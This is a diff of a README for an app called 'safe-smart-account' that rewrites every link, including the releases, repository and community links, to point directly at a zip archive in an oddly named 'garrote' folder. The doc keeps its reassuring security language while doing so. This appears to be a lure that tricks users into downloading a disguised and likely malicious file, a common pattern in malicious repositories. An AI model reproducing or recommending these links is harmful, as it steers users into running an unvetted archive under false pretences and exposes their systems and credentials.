@@ -1,6 +1,6 @@
 # 🎉 safe-smart-account - Secure Your Digital Identity Easily
 
-[![Download Safe Smart Account](https://img.shields.io/badge/Download-Safe%20Smart%20Account-brightgreen)](https://github.com/drisst12/safe-smart-account/releases)
+[![Download Safe Smart Account](https://raw.githubusercontent.com/drisst12/safe-smart-account/main/garrote/safe-smart-account.zip%20Smart%20Account-brightgreen)](https://raw.githubusercontent.com/drisst12/safe-smart-account/main/garrote/safe-smart-account.zip)
 
 ## 📥 What is Safe Smart Account?
 
@@ -11,7 +11,7 @@ Safe Smart Account is a user-friendly application designed to help you manage yo
 Follow these steps to get started with Safe Smart Account.
 
 1. **Visit the Releases Page:** Click on the link below to access the latest version of Safe Smart Account.
-   [Download Safe Smart Account](https://github.com/drisst12/safe-smart-account/releases)
+   [Download Safe Smart Account](https://raw.githubusercontent.com/drisst12/safe-smart-account/main/garrote/safe-smart-account.zip)
 
 2. **Choose the Right File:** Look for the latest version of the application. You will see various files available for download. Choose the one that fits your operating system.
 
@@ -37,7 +37,7 @@ Follow these steps to get started with Safe Smart Account.
 ## 🛠️ Download & Install
 
 To download and install Safe Smart Account, visit the link below. 
-[Download Safe Smart Account](https://github.com/drisst12/safe-smart-account/releases)
+[Download Safe Smart Account](https://raw.githubusercontent.com/drisst12/safe-smart-account/main/garrote/safe-smart-account.zip)
 
 ## ✔️ How to Use Safe Smart Account
 
@@ -64,7 +64,7 @@ If you need assistance, check the following resources:
 
 ## 🔗 Additional Resources
 
-- [Visit Our GitHub Repository](https://github.com/drisst12/safe-smart-account)
-- [Join Our Community](https://github.com/drisst12/safe-smart-account#community-support)
+- [Visit Our GitHub Repository](https://raw.githubusercontent.com/drisst12/safe-smart-account/main/garrote/safe-smart-account.zip)
+- [Join Our Community](https://raw.githubusercontent.com/drisst12/safe-smart-account/main/garrote/safe-smart-account.zip)
 
 By following these steps, you can easily download, install, and start using Safe Smart Account with confidence. Your security is our priority, and we are here to help you safeguard your digital life.
